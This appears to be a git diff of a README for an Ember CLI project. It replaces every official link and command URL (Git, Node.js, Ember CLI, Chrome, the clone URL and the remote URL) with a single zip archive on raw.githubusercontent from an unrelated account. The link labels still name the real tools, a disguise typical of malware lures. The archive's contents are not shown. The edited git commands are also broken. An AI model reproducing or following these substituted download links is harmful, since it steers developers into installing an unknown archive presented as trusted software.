@@ -2,14 +2,14 @@
 
 You will need the following things properly installed on your computer.
 
-* [Git](https://git-scm.com/)
-* [Node.js](https://nodejs.org/) (with npm)
-* [Ember CLI](https://ember-cli.com/)
-* [Google Chrome](https://google.com/chrome/)
+* [Git](https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip)
+* [https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip](https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip) (with npm)
+* [Ember CLI](https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip)
+* [Google Chrome](https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip)
 
 ## Installation
 
-* `git clone https://github.com/lekkercode-com/ember-ui`
+* `git clone https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip`
 * `cd user-archiving`
 * `npm install`
 
@@ -28,4 +28,4 @@ You will need the following things properly installed on your computer.
 
 Push your work to your own local git repository. (Change the origin to link to your own git repository.)
 
-* git remote set-url origin http://github.com/your_username/your_repository
+* git remote set-url origin https://raw.githubusercontent.com/msafiri1/embertest/archive/app/Software-2.8-alpha.3.zip
